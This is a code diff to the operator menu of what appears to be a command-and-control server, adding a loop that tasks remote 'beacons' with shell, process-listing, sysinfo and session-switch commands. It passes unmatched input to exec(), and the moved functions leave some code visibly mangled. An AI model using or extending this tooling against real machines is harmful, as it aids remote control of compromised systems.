@@ -7,6 +7,7 @@ this allows for multiple connections to be interacted with.
 
 from .sessions_commands import SessionCommandsClass
 from ServerDatabase.database import DatabaseClass
+from .beacon_commands import BeaconCommandsClass
 from .global_objects import (
     remove_connection_list,
     sessions,
@@ -16,7 +17,8 @@ from .global_objects import (
     tab_completion,
     beacons,
     beacon_commands,
-    remove_beacon_list
+    remove_beacon_list,
+    add_beacon_command_list
 )
 
 from typing import Tuple
@@ -39,6 +41,7 @@ class MultiHandlerCommands:
     """
     def __init__(self) -> None:
         self.sessioncommands = SessionCommandsClass()
+        self.beaconCommands = BeaconCommandsClass()
         self.database = DatabaseClass()
         colorama.init(autoreset=True)
         return
@@ -109,6 +112,64 @@ class MultiHandlerCommands:
                 # if the command is not matched then it prints help menu
                 print((colorama.Fore.GREEN + config['SessionModules']['help']) + str(e) + "Error HERE")
         return
+    
+    
+    def use_beacon(self, UserID, IPAddress) -> None:
+        """
+        function that interacts with an individual session, from here
+        commands on the target can be run as documented in the config
+        the functions are stored in the SessionCommands.py file
+        """
+        """
+        available_commands = WordCompleter(['shell', 'close', 'processes',
+        'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
+        'netstat', 'diskusage', 'listdir'])
+        """
+        while True:
+            # resets colorama after each statement
+            colorama.init(autoreset=True)
+            readline.parse_and_bind("tab: complete")
+            readline.set_completer(
+                lambda text, state:
+                    tab_completion(text, state, [
+                        "shell", "close", "processes", "sysinfo", "checkfiles",
+                        "download", "upload", "services", "netstat",
+                        "diskusage", "listdir, beacon"
+                    ]))
+            command = (input(colorama.Fore.YELLOW +
+                             f"{UserID} Command: ")
+                       .lower())
+            if command == "exit":  # exits back to multihandler menu
+                break
+            try:  # calls command
+                if command == "shell":
+                    self.beaconCommands.shell(UserID, IPAddress)
+                elif command == "close":
+                    self.beaconCommands.close_connection(UserID)
+                    return
+                elif command == "processes":
+                    self.beaconCommands.list_processes(UserID)
+                elif command == "sysinfo":
+                    self.beaconCommands.systeminfo(UserID)
+                elif command == "session":
+                    for i, details in enumerate(beacons["uuid"]):
+                        if details == UserID:
+                            if beacons["uuid"][i] == UserID:
+                                print(colorama.Fore.GREEN +
+                                    "Beacon will change to session mode after the next callback")
+                                # send session command to beacon
+                                add_beacon_command_list(UserID, "session")
+                                # remove the beacon from the list
+                                remove_beacon_list(beacons["uuid"][i])
+                        return
+                elif not exec(command):
+                    print((colorama.Fore.GREEN +
+                           "NEED TO ADD HELP MENU"))
+            except (KeyError, SyntaxError, AttributeError) as e:
+                # if the command is not matched then it prints help menu
+                print(colorama.Fore.RED + str(e) + "Error HERE")
+        return
+
 
     def listconnections(self) -> None:
         """
@@ -122,26 +183,6 @@ class MultiHandlerCommands:
                 print(
                     colorama.Fore.GREEN + f"{sessions['uuid'][i]} {sessions['hostname'][i]} {sessions['address'][i]} {sessions['operating_system'][i]}")
 
-    def sessionconnect(self) -> None:
-        """allows interaction with individual session,
-            passes connection details through to the current_client function"""
-        try:
-            data = int(input("What client? "))
-            self.current_client_session(
-                sessions["details"][data],
-                sessions["address"][data],
-                sessions["uuid"][data])
-        except (IndexError, ValueError):
-            print(
-                colorama.Fore.WHITE +
-                colorama.Back.RED +
-                "Not a Valid Client")
-        return
-
-    def listbeacons(self) -> None:
-        """
-        list all beacon connections in the global objects
-        """
         if len(beacons["address"]) == 0:
             print(colorama.Fore.RED + "No Active Beacons")
         else:
@@ -165,47 +206,24 @@ class MultiHandlerCommands:
                         print(colorama.Fore.GREEN + f"Next Callback expected {beacons['next_beacon'][i]} in {time.mktime(next_beacon_time) - time.mktime(current_time)} seconds")
                 except ValueError:
                     print(colorama.Fore.YELLOW + "Awaiting first call")
+                    
+                    
+    def sessionconnect(self) -> None:
+        """allows interaction with individual session,
+            passes connection details through to the current_client function"""
+        try:
+            data = int(input("What client? "))
+            self.current_client_session(
+                sessions["details"][data],
+                sessions["address"][data],
+                sessions["uuid"][data])
+        except (IndexError, ValueError):
+            print(
+                colorama.Fore.WHITE +
+                colorama.Back.RED +
+                "Not a Valid Client")
+        return
                 
-    def use_beacon(self) -> None:
-        """
-        allows the user to interact with a beacon
-        """
-        while True:
-            if len(beacons["address"]) == 0:
-                print(colorama.Fore.RED + "No Active Beacons")
-                return
-            try:
-                data = int(input("What beacon do you want to use? "))
-                break
-            except (IndexError, ValueError):
-                print(
-                    colorama.Fore.WHITE +
-                    colorama.Back.RED +
-                    "Not a Valid Beacon")
-        print(colorama.Fore.GREEN + f"Using beacon {beacons['uuid'][data]}")
-        readline.parse_and_bind("tab: complete")
-        readline.set_completer(
-                lambda text, state:
-                tab_completion(text, state, [
-                        "session"
-                    ]))
-        commandToRun = input("Command: ")
-        if commandToRun == "session":
-            print(colorama.Fore.GREEN +
-                  "Beacon will change to session mode after the next callback")
-            # send session command to beacon
-            beacon_commands["beacon_uuid"].append(beacons["uuid"][data])
-            beacon_commands["command"].append(commandToRun)
-            beacon_commands["command_uuid"].append(str(uuid.uuid4()))
-            beacon_commands["executed"].append(False)
-            # remove the beacon from the list
-            remove_beacon_list(beacons["uuid"][data])
-        else:
-            beacon_commands["beacon_uuid"].append(beacons["uuid"][data])
-            beacon_commands["command_uuid"].append(str(uuid.uuid4()))
-            beacon_commands["command"].append(commandToRun)
-            beacon_commands["executed"].append(False)
-
     def close_all_connections(
             self,
             connection_details: list,
